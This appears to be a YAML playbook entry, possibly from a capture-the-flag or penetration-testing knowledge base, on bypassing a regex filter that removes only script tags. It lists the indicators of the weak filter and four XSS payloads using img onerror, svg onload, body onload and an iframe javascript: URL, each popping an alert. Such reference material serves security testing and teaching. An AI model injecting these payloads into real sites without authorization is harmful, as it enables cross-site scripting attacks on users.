name: xss_script_tag_filter_bypass
category: web
tags: [xss, html_injection, filter_bypass, event_handler]
indicators:
  - "Script tag filtering with regex"
  - "re.sub(r'<script[^>]*>.*?</script>', '', msg)"
  - "User input directly inserted into HTML"
  - "Only script tags are filtered"

tricks:
  - name: "Bypass script tag filter with img onerror"
    when: "<script> tags are filtered but other tags are allowed"
    how: "Use img tag with onerror event"
    payload: |
      <img src=x onerror="alert('XSS')">

  - name: "Alternative: svg onload"
    when: "img might be filtered"
    how: "Use svg tag with onload event"
    payload: |
      <svg onload="alert('XSS')">

  - name: "Alternative: body onload"
    when: "Need another option"
    how: "Use body tag with onload event"
    payload: |
      <body onload="alert('XSS')">

  - name: "Alternative: iframe with javascript"
    when: "Event handlers might be filtered"
    how: "Use iframe with javascript: protocol"
    payload: |
      <iframe src="javascript:alert('XSS')">

